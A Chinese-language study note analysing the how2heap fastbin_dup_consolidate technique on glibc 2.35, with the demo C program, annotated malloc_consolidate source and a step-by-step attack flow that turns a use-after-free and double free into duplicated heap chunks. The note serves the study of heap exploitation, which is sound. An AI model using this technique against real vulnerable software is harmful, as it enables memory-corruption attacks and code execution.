.# 源码:
```
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

#define CHUNK_SIZE 0x400

int main() {
    printf("This technique will make use of malloc_consolidate and a double free to gain a duplication in the tcache.\n");
    printf("Lets prepare to fill up the tcache in order to force fastbin usage...\n\n");

    void *ptr[7];

    for(int i = 0; i < 7; i++)
        ptr[i] = malloc(0x40);

    void* p1 = malloc(0x40);
    printf("Allocate another chunk of the same size p1=%p \n", p1);

    printf("Fill up the tcache...\n");
    for(int i = 0; i < 7; i++)
        free(ptr[i]);

    printf("Now freeing p1 will add it to the fastbin.\n\n");
    free(p1);

    printf("To trigger malloc_consolidate we need to allocate a chunk with large chunk size (>= 0x400)\n");
    printf("which corresponds to request size >= 0x3f0. We will request 0x400 bytes, which will gives us\n");
    printf("a tcache-sized chunk with chunk size 0x410 ");
    void* p2 = malloc(CHUNK_SIZE);

    printf("p2=%p.\n", p2);

    printf("\nFirst, malloc_consolidate will merge the fast chunk p1 with top.\n");
    printf("Then, p2 is allocated from top since there is no free chunk bigger (or equal) than it. Thus, p1 = p2.\n");

    assert(p1 == p2);

    printf("We will double free p1, which now points to the 0x410 chunk we just allocated (p2).\n\n");
    free(p1); // vulnerability (double free)
    printf("It is now in the tcache (or merged with top if we had initially chosen a chunk size > 0x410).\n");

    printf("So p1 is double freed, and p2 hasn't been freed although it now points to a free chunk.\n");

    printf("We will request 0x400 bytes. This will give us the 0x410 chunk that's currently in\n");
    printf("the tcache bin. p2 and p1 will still be pointing to it.\n");
    void *p3 = malloc(CHUNK_SIZE);

    assert(p3 == p2);

    printf("We now have two pointers (p2 and p3) that haven't been directly freed\n");
    printf("and both point to the same tcache sized chunk. p2=%p p3=%p\n", p2, p3);
    printf("We have achieved duplication!\n\n");

    printf("Note: This duplication would have also worked with a larger chunk size, the chunks would\n");
    printf("have behaved the same, just being taken from the top instead of from the tcache bin.\n");
    printf("This is pretty cool because it is usually difficult to duplicate large sized chunks\n");
    printf("because they are resistant to direct double free's due to their PREV_INUSE check.\n");

    return 0;
}
```
这个样例,通过malloc一个largebin范围的chunk去触发`malloc_consolidate`函数,向后合并,之后uaf进行double free,再次malloc largebin chunk就能获得两个可控的,指向同一个chunk(在tcache中)的地址索引,实现chunk的重复分配.（这里关键是获得了两个指向更大overlapping_chunk的指针）。
现在回顾源码,`_int_malloc`中存在 如下结构:
```
static void *
_int_malloc (mstate av, size_t bytes)
{
   ......

  if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
    {
	......
    }

......

  if (in_smallbin_range (nb))
    {
	......
    }

......

  else
    {
      idx = largebin_index (nb);
      if (atomic_load_relaxed (&av->have_fastchunks))
        malloc_consolidate (av);
    }
}
```
也就是说,只有malloc的大小不在fastbin和smallbin范围内(0x10~0xc0),且tchache为空,或者大于tcahce的最大大小时,才会触发该函数.
下面先看一下`malloc_consolidate`函数的具体执行.
```
static void malloc_consolidate(mstate av)
{
  mfastbinptr*    fb;                 /* current fastbin being consolidated */
  mfastbinptr*    maxfb;              /* last fastbin (for loop control) */
  mchunkptr       p;                  /* current chunk being consolidated */
  mchunkptr       nextp;              /* next chunk to consolidate */
  mchunkptr       unsorted_bin;       /* bin header */
  mchunkptr       first_unsorted;     /* chunk to link to */

  /* These have same use as in free() */
  mchunkptr       nextchunk;
  INTERNAL_SIZE_T size;
  INTERNAL_SIZE_T nextsize;
  INTERNAL_SIZE_T prevsize;
  int             nextinuse;

/*
由于该函数会将所有在fastbin链表中的chunk放到其他地方,所以直接设置了have_fastchunks标志位
*/
  atomic_store_relaxed (&av->have_fastchunks, false);

  unsorted_bin = unsorted_chunks(av);

  /*
    Remove each chunk from fast bin and consolidate it, placing it
    then in unsorted bin. Among other reasons for doing this,
    placing in unsorted bin avoids needing to calculate actual bins
    until malloc is sure that chunks aren't immediately going to be
    reused anyway.
  */

  maxfb = &fastbin (av, NFASTBINS - 1);
  fb = &fastbin (av, 0);
  do {
    p = atomic_exchange_acq (fb, NULL);
    /*取了arena的fastbin中现在要遍历的索引（第一次为0）和最后一个索引处的地址，并将第一个索引处设为0．*/
    
    /*
    遍历arena中fastbin数组中链表头。
    */
    if (p != 0) {
      do {
	{
	  if (__glibc_unlikely (misaligned_chunk (p)))
	    malloc_printerr ("malloc_consolidate(): "
			     "unaligned fastbin chunk detected");
	/*对齐检测，heap段size与arena处对应索引一致性*/
	  unsigned int idx = fastbin_index (chunksize (p));
	  if ((&fastbin (av, idx)) != fb)
	    malloc_printerr ("malloc_consolidate(): invalid chunk size");
	}
	/*一些取值*/
	check_inuse_chunk(av, p);
	nextp = REVEAL_PTR (p->fd);

	/* Slightly streamlined version of consolidation code in free() */
	size = chunksize (p);
	nextchunk = chunk_at_offset(p, size);
	nextsize = chunksize(nextchunk);

	/*向前合并*/
	if (!prev_inuse(p)) {
	  prevsize = prev_size (p);
	  size += prevsize;
	  p = chunk_at_offset(p, -((long) prevsize));
	  if (__glibc_unlikely (chunksize(p) != prevsize))
	    malloc_printerr ("corrupted size vs. prev_size in fastbins");
	  unlink_chunk (av, p);
	}

	/*向后合并*/
	if (nextchunk != av->top) {
	  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

	  if (!nextinuse) {
	    size += nextsize;
	    unlink_chunk (av, nextchunk);
	  } else
		  /*fastbin被free时不会处理inuse位，这里进行处理*/
		 clear_inuse_bit_at_offset(nextchunk, 0);
	/*将p放进unsorted bin链表中*/
	  first_unsorted = unsorted_bin->fd;
	  unsorted_bin->fd = p;
	  first_unsorted->bk = p;
	/*处理后如果在smallbin范围中，清零其nextsize指针*/
	  if (!in_smallbin_range (size)) {
	    p->fd_nextsize = NULL;
	    p->bk_nextsize = NULL;
	  }

	  set_head(p, size | PREV_INUSE);
	  p->bk = unsorted_bin;
	  p->fd = first_unsorted;
	  set_foot(p, size);
	}

	/*下一个为top chunk则与其合并*/
	else {
	  size += nextsize;
	  set_head(p, size | PREV_INUSE);
	  av->top = p;
	}

      } while ( (p = nextp) != 0);/*遍历fastbin单向链表*/

    }
  } while (fb++ != maxfb);/*遍历fastbin链表头数组*/
}
```


# 图解过程:

## 1
```
  free(p1);
```
注意这里图中的0x50是fastbins中的,而0x410是tcache中的.
![[notes/pwn/堆利用/how2heap源码分析/2.35/fastbin_dup_consolidate/图/屏幕截图 2026-01-23 133404.png]]
![[notes/pwn/堆利用/how2heap源码分析/2.35/fastbin_dup_consolidate/图/屏幕截图 2026-01-23 130545.png]]
![[notes/pwn/堆利用/how2heap源码分析/2.35/fastbin_dup_consolidate/图/屏幕截图 2026-01-23 130718.png]]
## 2
```
 void* p2 = malloc(CHUNK_SIZE);
```
![[notes/pwn/堆利用/how2heap源码分析/2.35/fastbin_dup_consolidate/图/屏幕截图 2026-01-23 143016.png]]
![[notes/pwn/堆利用/how2heap源码分析/2.35/fastbin_dup_consolidate/图/屏幕截图 2026-01-23 131337.png]]
这里已经通过执行`consolidate`将上面free的chunk合并掉了,并且会维护fastbin链表
## 3
```
free(p1);
```
![[notes/pwn/堆利用/how2heap源码分析/2.35/fastbin_dup_consolidate/图/屏幕截图 2026-01-23 133856.png]]
![[notes/pwn/堆利用/how2heap源码分析/2.35/fastbin_dup_consolidate/图/屏幕截图.png]]
这里相当于利用uaf,再次free(p1).此时该处chunk的size改变,因此进入tcahche.0x410.
## 4
```
void *p3 = malloc(CHUNK_SIZE);
```
![[notes/pwn/堆利用/how2heap源码分析/2.35/fastbin_dup_consolidate/图/屏幕截图 2026-01-23 134810.png]]
![[notes/pwn/堆利用/how2heap源码分析/2.35/fastbin_dup_consolidate/图/屏幕截图 2026-01-23 135152 1.png]]
现在,再次malloc(0x410)就能获得被free的chunk,这时,不算uaf的p1,我们就有了两个指向同一物理地址的chunk指针. 

# 攻击流程
1.确定有uaf,填满一个fastbin大小的tcache bin.
2.free一个chunk p1进fastbin,再free一个大chunk p2,触发consolidate.
这一步,我们获得了一个可控指针p2,并且改变的该处chunk的size大小.
3.利用uaf,重复利用p1指针,将该chunk free进一个大tchache bin中,再申请chunk p3,获得第二个同物理地址可控指针.